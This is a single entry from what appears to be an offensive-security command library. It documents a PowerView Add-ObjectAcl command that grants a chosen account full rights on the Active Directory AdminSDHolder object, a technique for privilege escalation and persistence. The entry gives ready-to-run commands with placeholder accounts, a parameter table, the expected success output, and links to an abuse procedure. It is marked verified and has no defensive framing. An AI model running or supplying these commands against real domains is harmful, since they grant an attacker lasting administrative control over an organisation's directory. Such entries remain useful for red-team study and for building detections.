---
id: ab65e703-74ba-4004-beba-ad0a1f855fc1
type: command
executor: powershell
data: >-
  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System'
  -PrincipalSamAccountName $_PRINCIPAL_ACCOUNT -Verbose -Rights All
output: null
created_at: '2023-04-06T03:56:06.430470+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - acl-modification
  - adminsdholder
verified: true
validated: true
---

# grant-all-rights-to-adminsdholder

## Command

```powershell
Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName $_PRINCIPAL_ACCOUNT -Verbose -Rights All
```

## Description

Grants all rights to a principal account on the AdminSDHolder object using ACL modification. Alternative syntax to Add-DomainObjectAcl for broader compatibility.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -TargetADSprefix | Prefix of the target AD object (AdminSDHolder) | Yes |
| -PrincipalSamAccountName | SAM name of the account gaining rights | Yes |
| -Rights | Rights to assign (All for full access) | Yes |
| -Verbose | Detailed execution feedback | No |

## Examples

### Basic Usage

```powershell
Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName toto -Verbose -Rights All
```

### Advanced Usage

```powershell
Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName controlled -Rights All
```

## Expected Output

"ACL entry added for 'toto' with Full Control on AdminSDHolder." Success confirmed by lack of exceptions.

## Related

- [[procedures/Abuse-AdminSDHolder-for-Privilege-Escalation]]
- [[commands/add-full-control-acl-to-adminsdholder]]
